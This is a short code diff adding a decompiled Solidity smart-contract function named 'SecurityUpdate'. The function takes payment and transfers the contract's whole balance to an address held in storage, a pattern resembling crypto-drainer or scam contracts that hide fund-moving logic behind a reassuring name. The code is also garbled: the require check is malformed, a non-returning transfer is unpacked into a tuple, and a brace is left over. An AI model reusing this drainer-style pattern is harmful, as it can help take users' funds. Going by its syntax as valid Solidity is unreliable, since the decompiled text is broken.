@@ -1,0 +1,7 @@
+
+// Function from be535a82f2c3895bdaceb3ffe6b9b80ac2f832a0 - SecurityUpdate in be535a82f2c3895bdaceb3ffe6b9b80ac2f832a0-decompiled.sol
+function SecurityUpdate() public payable {
+        require(!msg.value > 0);
+        (bool success, bytes memory ret0) = address(store_a / 0x01).transfer(address(this).balance);
+    }
+}
